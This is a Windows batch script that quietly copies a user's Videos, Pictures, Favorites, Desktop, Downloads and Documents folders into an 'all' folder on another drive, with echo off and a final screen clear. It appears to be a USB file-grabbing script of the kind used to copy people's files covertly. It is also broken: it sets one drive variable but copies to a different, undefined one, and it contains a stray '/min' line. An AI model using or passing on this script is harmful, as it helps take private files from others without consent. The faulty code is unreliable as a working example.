@echo off
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%USERPROFILE%\videos" "%drive%\all\"
%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\"
%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\Saved Pictures"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
%backupcmd% "%USERPROFILE%\Desktop" "%drive%\all\Desktop"
%backupcmd% "%USERPROFILE%\Downloads" "%drive%\all\Downloads"
%backupcmd% "%USERPROFILE%\Documents" "%drive%\all\Documents"

@echo off
cls
